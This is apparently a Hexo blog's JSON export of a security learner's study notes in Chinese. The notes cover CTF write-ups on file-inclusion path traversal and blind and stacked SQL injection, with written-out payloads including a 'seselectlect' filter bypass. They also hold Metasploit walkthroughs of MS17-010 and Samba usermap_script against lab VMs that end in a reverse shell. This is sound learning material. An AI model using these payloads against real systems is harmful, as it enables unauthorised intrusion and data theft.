{"meta":{"title":"Sy0ung","subtitle":"","description":"","author":"Sy0ung","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"区块链","slug":"区块链","date":"2020-11-23T11:54:03.408Z","updated":"2020-11-22T09:26:06.757Z","comments":true,"path":"2020/11/23/区块链/","link":"","permalink":"http://yoursite.com/2020/11/23/%E5%8C%BA%E5%9D%97%E9%93%BE/","excerpt":"","text":"区块：多条账目的打包链：将两个相邻的日子的账本联系起来区块链：大家共同维护一个账本，并且这个账本具有不可被随意篡改、公开透明、账目可靠和去中心化的特点区块链的网络路由方式，用户对用户，每个人既是信息的接收者，同时也是信息的传播者","categories":[],"tags":[]},{"title":"攻防世界-Web进阶-warmup","slug":"攻防世界-Web进阶-warmup","date":"2020-11-23T11:54:03.406Z","updated":"2020-11-21T03:50:04.807Z","comments":true,"path":"2020/11/23/攻防世界-Web进阶-warmup/","link":"","permalink":"http://yoursite.com/2020/11/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web%E8%BF%9B%E9%98%B6-warmup/","excerpt":"","text":"攻防世界-Web进阶-warmupF12查看源码，发现source.php 访问source.php，发现是代码审计题 白名单whitlist中有hint.php，访问 得知ffffllllaaaagggg应该是放有flag的文件 对source.php进行审计 目的执行 include $_REQUEST[‘file’]; 这句代码关键 发现满足三个条件，会包含并运行指定文件file，此处的file可以由我们构造，为切入点： 检查file变量是否为空 检查file变量是否为字符串 通过自定义的checkFile函数来检查 由于我们要构造payload，前两点直接满足，直接查看checkFile函数代码： 访问http://220.249.52.133:44549/?file=source.php?ffffllllaaaagggg，页面返回空 说明经过checkFile函数返回True，而此时include无法包含source.php?ffffllllaaaagggg.php这个文件，则需要深入了解include函数 为什么include source.php(或hint.php)?/../../../../ffffllllaaaagggg能执行成功 因为我们的参数是有/../../../../这样的路径，所以符合最后一段话如果定义了路径，就会忽略/前的字符串即source.php而去找/../../../../ffffllllaaaagggg这个文件，而需要几个../需要依次测试，当为四个../时页面显示flag","categories":[],"tags":[]},{"title":"ms17_010（永恒之蓝）漏洞利用","slug":"ms17_010（永恒之蓝）漏洞利用","date":"2020-11-23T11:54:03.404Z","updated":"2020-11-19T03:22:49.743Z","comments":true,"path":"2020/11/23/ms17_010（永恒之蓝）漏洞利用/","link":"","permalink":"http://yoursite.com/2020/11/23/ms17_010%EF%BC%88%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","excerpt":"","text":"ms17_010（永恒之蓝）漏洞利用1、MS17-010是什么123MS17-010漏洞利用模块就是利用Windows系统的Windows SMB远程执行代码漏洞，向Microsoft服务器消息块（SMBv1）服务器发送经特殊设计的消息后，允许远程代码执行。成功利用这些漏洞的攻击者即可获得在目标系统上执行代码的权利。 2、准备虚拟机win7 64位和kali查看win7虚拟机IP： kali IP： 3、对win7进行端口扫描使用kali的nmap工具进行扫描，在kali终端输入nmap –sS –sV –Pn 192.168.0.101即可进行扫描，-sS 是半开放扫描，比普通扫描要快,-sV是版本检测,-Pn是不对目标主机进行存活性判断，直接扫描，注意要把win7的防火墙关闭了，不然会被拦截 445端口开放。 4、使用Metasploit Framework工具（1）搜索ms17_010漏洞利用模块 （2）先使用Auxiliaries辅助模块：auxiliary/scanner/smb/smb_ms17_010这个模块进行漏洞的分析，看看445端口是否能被入侵show options查看这个模块的选项，在Required那列中，yes的是必填的,no是选填的，默认帮我们已经写好了大部分的参数，但我们还是要手动设置一下RHOSTS的参数，即指定的主机ip，这里我们写被攻击的win7的ipset RHOSTS 192.168.175.129接着输入run执行探测主机可能容易受到MS17-010的攻击！这里就基本可以确认，ms17-010可以入侵该win7（3）使用攻击模块使用这个模块，我们show targets看一下这个模块适用于哪些系统的主机可以看到,win7和server 2008 r2都适用show options来看看有哪些选项 设置RHOST，即要攻击的主机ip即可set RHOST 192.168.175.129接着run执行攻击出现了win7的cmd，这是已经是渗透成功了。但有时候不一定会成功，会返回FAIL，说明这个系统打了补丁，这个漏洞已经没有威力了。之后就可以建用户开端口了，渗透成功。","categories":[],"tags":[]},{"title":"Metasploit学习： Samba服务 usermap_script安全漏洞利用","slug":"Metasploit学习： Samba服务 usermap_script安全漏洞利用","date":"2020-11-23T11:54:03.401Z","updated":"2020-11-18T11:52:22.940Z","comments":true,"path":"2020/11/23/Metasploit学习： Samba服务 usermap_script安全漏洞利用/","link":"","permalink":"http://yoursite.com/2020/11/23/Metasploit%E5%AD%A6%E4%B9%A0%EF%BC%9A%20Samba%E6%9C%8D%E5%8A%A1%20usermap_script%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","excerpt":"","text":"Metasploit学习： Samba服务 usermap_script安全漏洞利用1、username_script 是什么1234- Samba协议的一个漏洞CVE-2007-2447，用户名映射脚本命令执行- 影响Samba的3.0.20到3.0.25rc3 版本- 当使用非默认的用户名映射脚本配置选项时产生- 通过指定一个包含shell元字符的用户名，攻击者能够执行任意命令 2、如何利用11、使用metasploit框架 3、漏洞时间线123456漏洞的时间线： - 2007年5月7日：漏洞匿名披露到security@samba.org电子邮件列表中。- 2007年5月7日：Samba的开发人员Gerald Carter开始响应这个漏洞。- 2007年5月9日：Samba的开发者Jeremy Allison发布了补丁，用于iDefense测试。- 2007年5月10日：向vendor-sec邮件列表发布通知。- 2007年5月14日：公开漏洞信息。 4、利用过程工具书：Web安全攻防渗透测试实战指南 首先查看靶机metasploitable的IP地址 对靶机进行扫描，收集可用的服务信息。使用nmap扫描并查看系统开放端口和相关的应用程序 收集到目标机相关信息后，选择正确的Exploit和Payload，扫描结果显示主机运行着Samba3.x服务。 Samba是在Linux和UNIX系统上实现SMB (Server Messages Block,信息服务块)协议的一款免费软件。SMB是一种在局域网上共享文件和打印机的通信协议，它在局域网内使用Linux和Windows系统的机器之间提供文件及打印机等资源的共享服务。 输入msf &gt; search samba 命令搜索Samba的漏洞利用模块，并选择合适的漏洞利用模块 Samba服务将返回漏洞利用模块的列表，因为exploit/multi/samba/usermap_script被标记为“Excellent”，选择此模块进行接下来的渗透。 查看漏洞详细信息可用如图命令： 使用该漏洞利用模块，并查看该漏洞利用模块下可供选择的攻击载荷模块。 选择基础的cmd/unix/reverse反向攻击载荷模块 设置被攻击主机IP地址、该漏洞利用的端口号、发动攻击主机IP地址。 再次确认参数是否已设置正确 设置完所有参数变量后，输入攻击命令exploit或者run，发动攻击。 MSF发动攻击成功后会获取目标主机的shell，验证该shell是目标主机可以查询主机名、用户名和IP地址。在攻击机和目标机之间建立了一个shell连接。 图形化界面工具msfgui：https://blog.csdn.net/qq_43968080/article/details/103544016","categories":[],"tags":[]},{"title":"Metasploit把command shell转为meterpreter shell","slug":"Metasploit把command shell转为meterpreter shell","date":"2020-11-23T11:54:03.399Z","updated":"2020-11-19T03:29:31.223Z","comments":true,"path":"2020/11/23/Metasploit把command shell转为meterpreter shell/","link":"","permalink":"http://yoursite.com/2020/11/23/Metasploit%E6%8A%8Acommand%20shell%E8%BD%AC%E4%B8%BAmeterpreter%20shell/","excerpt":"","text":"Metasploit把command shell转为meterpreter shell获取command shell使用metasploit工具，使用漏洞利用模块exploit/multi/samba/usermap_script拿到metasploitbale虚拟机的shell 这里的shell是普通的command shell shell转换ctrl+Z，选择y，则将当前shell放到后台。 输入sessions -l(小写的L)查看当前活跃的sessions 是刚才挂起的metasploitable的shell，当前的session id是2，执行下图命令 use post/multi/manage/shell_to_meterpreter 再次输入sessions -l 查看后台的sessions 多了一个Id为3的meterpreter shell，输入session -i 3,调用Id为3的shell,至此转换成功。","categories":[],"tags":[]},{"title":"2020.11.19","slug":"2020.11.19","date":"2020-11-23T11:54:03.397Z","updated":"2020-11-19T15:02:43.447Z","comments":true,"path":"2020/11/23/2020.11.19/","link":"","permalink":"http://yoursite.com/2020/11/23/2020.11.19/","excerpt":"","text":"2020.11.19Web安全攻防：P190-P233 CTF从0到1：SQL注入-2 l 尝试账号密码都为admin，提示账号或密码错误，若修改账号为1提示账号不存在， 密码是隐藏的，则猜测只能通过账号来进行注入 尝试账号:admin’ 账号不存在 尝试admin’ # 提示账号或密码错误 多尝试几次： 得知账号存在布尔盲注 database():note首先测试数据库长度 则数据库长度为4 利用substr判断数据库库名： admin’ and substr(database(),1,1)=’a’ # 用burpsuite在a处进行爆破，依次得出数据库名:note table_name:fl4g在爆破表名时发现select被过滤，尝试双写select，成功绕过 数据表长度：admin’ and length((seselectlect table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;=4 # 得出长度为4 爆破数据表名： admin’ and substr((seselectlect table_name from information_schema.tables where table_schema = ‘note’ limit 0,1),1,1)=’a’ # 得出表名fl4g column_name:flag同上 select flag from fl4g:n1book{login_sqli_is_nice}admin’ and length((seselectlect flag from fl4g))=3 # 爆破得到flag长度为26 admin’ and substr((seselectlect flag from fl4g),1,1)=’a’ # 爆破得到flag","categories":[],"tags":[]},{"title":"2020.11.15","slug":"2020.11.15","date":"2020-11-23T11:54:03.395Z","updated":"2020-11-19T13:40:17.148Z","comments":true,"path":"2020/11/23/2020.11.15/","link":"","permalink":"http://yoursite.com/2020/11/23/2020.11.15/","excerpt":"","text":"2020.11.15CTF从0到1SQL注入使用优先级：UNION注入 &gt; 报错注入 &gt; 布尔盲注 &gt; 时间盲注 P7-P33","categories":[],"tags":[]},{"title":"2020.11.12","slug":"2020.11.12","date":"2020-11-23T11:54:03.392Z","updated":"2020-11-14T04:14:13.937Z","comments":true,"path":"2020/11/23/2020.11.12/","link":"","permalink":"http://yoursite.com/2020/11/23/2020.11.12/","excerpt":"","text":"2020/11/12Web安全攻防：P90-P180 攻防世界Web进阶：supersqli-强网杯2019：​ 堆叠注入获取到两个表，words表包含id和data字段，页面显示的为words表内容。这道题没有禁用rename和alert，所以我们可以采用修改表结构的方法来得到flag 将words表名改为words1，再将数字名表改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段。 1&#39;;rename tables words to words1;rename tables 1919810931114514 to words; alter table words change flag id varchar(100);# 这段代码的意思是将words表名改为words1，1919810931114514表名改为words，将现在的words表中的flag列名改为id 然后用1&#39; or 1=1 #得到flag","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2020-06-11T16:37:25.590Z","updated":"2020-06-11T16:37:25.590Z","comments":true,"path":"2020/06/12/hello-world/","link":"","permalink":"http://yoursite.com/2020/06/12/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[]}